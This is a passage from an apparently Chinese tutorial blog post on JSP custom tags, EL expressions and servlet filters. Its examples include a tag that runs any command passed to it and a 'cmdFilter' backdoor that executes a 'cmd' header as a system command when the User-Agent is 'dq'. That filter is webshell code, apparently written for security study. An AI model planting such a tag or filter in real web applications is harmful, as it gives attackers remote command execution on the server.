<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doTag</span><span class="params">()</span> <span class="keyword">throws</span> JspException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.cmd == <span class="keyword">null</span>)&#123;</span><br><span class="line">            getJspBody().invoke(sw);</span><br><span class="line">            <span class="keyword">this</span>.cmd = <span class="keyword">this</span>.sw.toString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        String line;</span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(java.lang.Runtime.getRuntime().exec(<span class="keyword">this</span>.cmd).getInputStream(),<span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">        <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">            sb.append(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.show)&#123;</span><br><span class="line">            getJspContext().getOut().write(sb.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后打包成 <code>jar</code> ，放入指定目录中👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202232033578.png" alt="image-20220223203359367"></p>
<p>再写入 <code>tld</code> 文件👇</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">taglib</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tlib-version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">tlib-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp-version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">jsp-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">short-name</span>&gt;</span>c_t<span class="tag">&lt;/<span class="name">short-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>execute<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tag-class</span>&gt;</span>custom.cmd<span class="tag">&lt;/<span class="name">tag-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body-content</span>&gt;</span>scriptless<span class="tag">&lt;/<span class="name">body-content</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">attribute</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">required</span>&gt;</span>false<span class="tag">&lt;/<span class="name">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>java.lang.String<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">attribute</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>show<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">required</span>&gt;</span>false<span class="tag">&lt;/<span class="name">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>以上内容是给这个标签规定了 <code>2</code> 个属性，分别为 <code>cmd</code> 和 <code>show</code> (这两个属性非强制要求赋值)，其中 <code>cmd</code> 属性类型被规定为 <code>String</code> 型，用作输入命令，而 <code>show</code> 属性类型被规定为 <code>boolean</code> 型，判断是否将命令执行结果回显；并且可支持将内嵌内容传入 <code>cmd</code> 属性。</p>
<p>在 <code>web.xml</code> 中引入👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202232023547.png" alt="image-20220223202302473"></p>
<p>然后将以下内容写入 <code>tag.jsp</code> 文件👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;cmd&quot;</span> uri=<span class="string">&quot;//localhost/custom_tag/cmd&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;TAG&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;cmd:execute cmd=<span class="string">&quot;echo \&quot;属性\&quot;&quot;</span> show=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">&lt;cmd:execute show=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line">    echo <span class="string">&quot;内嵌&quot;</span></span><br><span class="line">&lt;/cmd:execute&gt;</span><br><span class="line">&lt;cmd:execute cmd=<span class="string">&quot;echo \&quot;属性,不显示\&quot;&quot;</span> show=<span class="string">&quot;false&quot;</span>/&gt;</span><br><span class="line">&lt;cmd:execute show=<span class="string">&quot;false&quot;</span>&gt;</span><br><span class="line">    echo <span class="string">&quot;内嵌，不显示&quot;</span></span><br><span class="line">&lt;/cmd:execute&gt;</span><br><span class="line">&lt;cmd:execute cmd=<span class="string">&quot;calc.exe&quot;</span> show=<span class="string">&quot;false&quot;</span>/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202232035595.png" alt="image-20220223203528491"></p>
<h4 id="EL表达式">- EL表达式 -</h4>
<p><code>jsp</code> 表达式语言即 <code>JSP EL</code> 使得访问存储在各式各样 <code>javaBean</code> 中的数据变得简单，其既可以用来创建算术表达式，也可以用来创建逻辑表达式。</p>
<p>简单的语法如下👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;[表达式内容]&#125;</span><br></pre></td></tr></table></figure>
<p>在 <code>JSP EL</code> 中的通用操作符为 <code>.</code> 和 <code>[]</code>，比如想用 <code>jsp</code> 标签指定 <code>x</code> 的 <code>length</code> 属性的值👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:setProperty name=<span class="string">&quot;x&quot;</span> property=<span class="string">&quot;length&quot;</span> value=<span class="string">&quot;100&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
<p>但这个 <code>length</code> 属性是需要动态变化的，这时就可以用到 <code>JSP EL</code> 了👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:setProperty name=<span class="string">&quot;x&quot;</span> property=<span class="string">&quot;length&quot;</span> value=<span class="string">&quot;$&#123;param[&#x27;a&#x27;]+param[&#x27;b&#x27;]&#125;&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
<p>以上的意思是将请求参数 <code>a</code> 和 <code>b</code> 值相加得到的结果赋值给 <code>x</code> 的 <code>length</code> 属性。</p>
<p>若想要停用 <code>JSP EL</code> ，可以在开头写入👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored =<span class="string">&quot;true&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>以下是有关 <code>JSP EL</code> 的操作符(摘自<a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jsp-expression-language.html">jsp表达式语言</a>)👇</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>操作符</strong></th>
<th style="text-align:left"><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">.</td>
<td style="text-align:left">访问一个<code>Bean</code>属性或者一个映射条目</td>
</tr>
<tr>
<td style="text-align:left">[]</td>
<td style="text-align:left">访问一个数组或者链表的元素</td>
</tr>
<tr>
<td style="text-align:left">( )</td>
<td style="text-align:left">组织一个子表达式以改变优先级</td>
</tr>
<tr>
<td style="text-align:left">+</td>
<td style="text-align:left">加</td>
</tr>
<tr>
<td style="text-align:left">-</td>
<td style="text-align:left">减或负</td>
</tr>
<tr>
<td style="text-align:left">*</td>
<td style="text-align:left">乘</td>
</tr>
<tr>
<td style="text-align:left">/ or div</td>
<td style="text-align:left">除</td>
</tr>
<tr>
<td style="text-align:left">% or mod</td>
<td style="text-align:left">取模</td>
</tr>
<tr>
<td style="text-align:left">== or eq</td>
<td style="text-align:left">测试是否相等</td>
</tr>
<tr>
<td style="text-align:left">!= or ne</td>
<td style="text-align:left">测试是否不等</td>
</tr>
<tr>
<td style="text-align:left">&lt; or lt</td>
<td style="text-align:left">测试是否小于</td>
</tr>
<tr>
<td style="text-align:left">&gt; or gt</td>
<td style="text-align:left">测试是否大于</td>
</tr>
<tr>
<td style="text-align:left">&lt;= or le</td>
<td style="text-align:left">测试是否小于等于</td>
</tr>
<tr>
<td style="text-align:left">&gt;= or ge</td>
<td style="text-align:left">测试是否大于等于</td>
</tr>
<tr>
<td style="text-align:left">&amp;&amp; or and</td>
<td style="text-align:left">测试逻辑与</td>
</tr>
<tr>
<td style="text-align:left">|| or or</td>
<td style="text-align:left">测试逻辑或</td>
</tr>
<tr>
<td style="text-align:left">! or not</td>
<td style="text-align:left">测试取反</td>
</tr>
<tr>
<td style="text-align:left">empty</td>
<td style="text-align:left">测试是否空值</td>
</tr>
</tbody>
</table>
<p>当然，在 <code>JSP EL</code> 中使用标签库定义的函数也是可以的，比如👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;fn&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/functions&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;EL&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;jsp:text&gt;</span><br><span class="line">    $&#123;fn:toLowerCase(<span class="string">&quot;A&quot;</span>)&#125;</span><br><span class="line">    $&#123;fn:toUpperCase(<span class="string">&quot;a&quot;</span>)&#125;</span><br><span class="line">    $&#123;fn:join(fn:split(<span class="string">&quot;a b c d e f&quot;</span>,<span class="string">&quot; &quot;</span>),<span class="string">&quot;|&quot;</span>)&#125;</span><br><span class="line">&lt;/jsp:text&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202232110575.png" alt="image-20220223211009460"></p>
<p>同时 <code>JSP EL</code> 还支持下列的隐含对象(摘自<a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jsp-expression-language.html">jsp表达式语言</a>)👇</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>隐含对象</strong></th>
<th style="text-align:left"><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">pageScope</td>
<td style="text-align:left">page 作用域</td>
</tr>
<tr>
<td style="text-align:left">requestScope</td>
<td style="text-align:left">request 作用域</td>
</tr>
<tr>
<td style="text-align:left">sessionScope</td>
<td style="text-align:left">session 作用域</td>
</tr>
<tr>
<td style="text-align:left">applicationScope</td>
<td style="text-align:left">application 作用域</td>
</tr>
<tr>
<td style="text-align:left">param</td>
<td style="text-align:left">Request 对象的参数，字符串</td>
</tr>
<tr>
<td style="text-align:left">paramValues</td>
<td style="text-align:left">Request对象的参数，字符串集合</td>
</tr>
<tr>
<td style="text-align:left">header</td>
<td style="text-align:left">HTTP 信息头，字符串</td>
</tr>
<tr>
<td style="text-align:left">headerValues</td>
<td style="text-align:left">HTTP 信息头，字符串集合</td>
</tr>
<tr>
<td style="text-align:left">initParam</td>
<td style="text-align:left">上下文初始化参数</td>
</tr>
<tr>
<td style="text-align:left">cookie</td>
<td style="text-align:left">Cookie值</td>
</tr>
<tr>
<td style="text-align:left">pageContext</td>
<td style="text-align:left">当前页面的pageContext</td>
</tr>
</tbody>
</table>
<p>这样就一目了然了，比方说上面的 <code>$&#123;param['a']+param['b']&#125;</code> 即是获取传入参数 <code>a</code> 和 <code>b</code> 之和。</p>
<h3 id="过滤器-filter">- 过滤器(filter) -</h3>
<p>过滤器即 <code>filter</code> 在 <code>servlet</code> 和 <code>jsp</code> 中都是 <code>Java</code> 类，在请求访问后端资源前用以处理 <code>ServletRequest</code> 和 <code>ServletResponse</code> ，可以理解为中间件。一般常用的过滤器类型如下👇</p>
<ul>
<li>认证过滤器</li>
<li>数据压缩过滤器</li>
<li>加密过滤器</li>
<li>触发资源访问事件过滤器</li>
<li>图形转换过滤器</li>
<li>登录和验证过滤器</li>
<li>MIME类型链过滤器</li>
<li>令牌过滤器</li>
<li>转换XML内容的XSL/T过滤器</li>
</ul>
<p>过滤器和 <code>servlet</code> 在 <code>web.xml</code> 的配置差不多都先需要一个标签如 <code>&lt;filter&gt;</code> 指明名称和应用的过滤类，再用 <code>&lt;filter-mapping&gt;</code> 使用 <code>url</code> 正则匹配或对指定 <code>servlet</code> 生效模式。</p>
<h4 id="代码-2">- 代码 -</h4>
<p>如果要写一个过滤器就得实现 <code>javax.servlet.Filter</code> 接口，在 <code>javax.servlet.Filter</code> 接口中定义了以下方法👇</p>
<ul>
<li><code>default public void init(FilterConfig filterConfig) throws ServletException &#123;&#125;</code></li>
<li><code>public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException</code></li>
<li><code>default public void destroy() &#123;&#125;</code></li>
</ul>
<p>其中 <code>init</code> 方法和 <code>servlet</code> 的 <code>init</code> 方法差不多，当过滤器被实例化后会被调用，而 <code>doFilter</code> 方法即是需要进行重写自定义过滤器处理方式的方法，后面的 <code>destroy</code> 方法则是当不再需要过滤器时被调用。</p>
<h4 id="自定义过滤器">- 自定义过滤器 -</h4>
<p>由于过滤器的 <code>doFilter</code> 方法中会收到一个名为 <code>chain</code> 的 <code>FilterChain</code> 类型的参数，目的是将经上一次过滤器得到的 <code>request</code> 和 <code>response</code> 传递过来，也就是说过滤器的调用过程实际上是一个含有多个过滤器的链表中各个过滤器的依次调用。</p>
<p>当执行完 <code>doFilter</code> 方法中的处理过程后，别忘了加上一句 <code>filterChain.doFilter(servletRequest,servletResponse)</code> 将 <code>servletRequest</code> 和 <code>servletResponse</code> 传递给下一个过滤器，如果没有加上 <code>filterChain.doFilter(servletRequest,servletResponse)</code> 就会在此中断(后面页面的内容也不会显示)。</p>
<h5 id="单个过滤器">- 单个过滤器 -</h5>
<p>比如写一个名为 <code>cmdFilter</code> 的过滤器，功能如下👇</p>
<ul>
<li>当名为 <code>evil</code> 的 <code>servlet</code> 或 <code>*.jsp</code> 页面接收到客户请求时判断其 <code>user-agent</code> 是否为 <code>dq</code></li>
<li>若 <code>user-agent</code> 为 <code>dq</code> 则判断是否存在 <code>cmd</code> 请求标头</li>
<li>若存在名为 <code>cmd</code> 的请求标头则将 <code>cmd</code> 请求标头的值去执行系统命令</li>
<li>将执行命令的结果追加到响应内容中返回给客户端</li>
</ul>
<p>先自定义一个实现 <code>javax.servlet.Filter</code> 接口的 <code>cmdFilter</code> 类👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cmdFilter</span> <span class="keyword">implements</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">Filter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        Filter.<span class="keyword">super</span>.init(filterConfig);</span><br><span class="line">        <span class="keyword">if</span>((<span class="keyword">this</span>.userName = filterConfig.getInitParameter(<span class="string">&quot;name&quot;</span>)) == <span class="keyword">null</span> || !<span class="keyword">this</span>.userName.equals(<span class="string">&quot;dq&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">this</span>.userName = <span class="string">&quot;dq&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String ua = ((HttpServletRequest) servletRequest).getHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line">        String cmd = ((HttpServletRequest) servletRequest).getHeader(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(ua != <span class="keyword">null</span> &amp;&amp; cmd != <span class="keyword">null</span> &amp;&amp; ua.equals(<span class="keyword">this</span>.userName) )&#123;</span><br><span class="line"></span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(java.lang.Runtime.getRuntime().exec(cmd).getInputStream(),<span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String line;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">               sb.append(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            servletResponse.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            servletResponse.getWriter().write(sb.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后将其打包成 <code>jar</code> 放到对应目录，再更改 <code>web.xml</code> 内容如下👇</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>cmdFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>custom.cmdFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>name<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>dq<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>cmdFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>evil<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当然，如果 <code>servlet3.0+</code> 可以用以下代码等价上面的配置👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebFilter(filterName = &quot;cmdFilter&quot;, value = &#123;&quot;*.jsp&quot;, &quot;/evil&quot;&#125;, initParams = &#123;@WebInitParam(name = &quot;name&quot;, value = &quot;dq&quot;)&#125;)</span></span><br></pre></td></tr></table></figure>
<p>配置好后访问相应的页面，如访问 <code>a_evil.jsp</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241156368.png" alt="image-20220224115649221"></p>
<p>以及访问 <code>evil</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241207511.png" alt="image-20220224120707392"></p>
<h5 id="多个过滤器">- 多个过滤器 -</h5>
<p>当然，由于对过滤器的调用类似一个链表，那么是可以按照顺序来执行数个过滤器的，比如假若想实现以下功能👇</p>
<ul>
<li><code>过滤器A</code>
<ul>
<li>当客户端访问 <code>*.jsp</code> 页面时输出将访问 <code>ip</code> 输出</li>
<li>将客户端请求的部分数据打包发给下一个 <code>过滤器B</code></li>
</ul>
</li>
<li><code>过滤器B</code>
<ul>
<li>将从 <code>过滤器A</code> 打包的数据输出出来</li>
</ul>
</li>
</ul>
<p>有关 <code>过滤器A</code> 的代码👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AFilter</span> <span class="keyword">implements</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">Filter</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        Filter.<span class="keyword">super</span>.init(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String userIP = servletRequest.getRemoteAddr();</span><br><span class="line">        String userAgent = ((HttpServletRequest) servletRequest).getHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line"></span><br><span class="line">        servletResponse.getWriter().write(String.join(<span class="string">&quot;&lt;br&gt;&quot;</span>,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;- Filter A -&quot;</span>,userIP,<span class="string">&quot;- END -&quot;</span>,<span class="string">&quot;&quot;</span>&#125;));</span><br><span class="line"></span><br><span class="line">        servletRequest.setAttribute(<span class="string">&quot;IP&quot;</span>,userIP);</span><br><span class="line">        servletRequest.setAttribute(<span class="string">&quot;UA&quot;</span>,userAgent);</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有关 <code>过滤器B</code> 的代码👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BFilter</span> <span 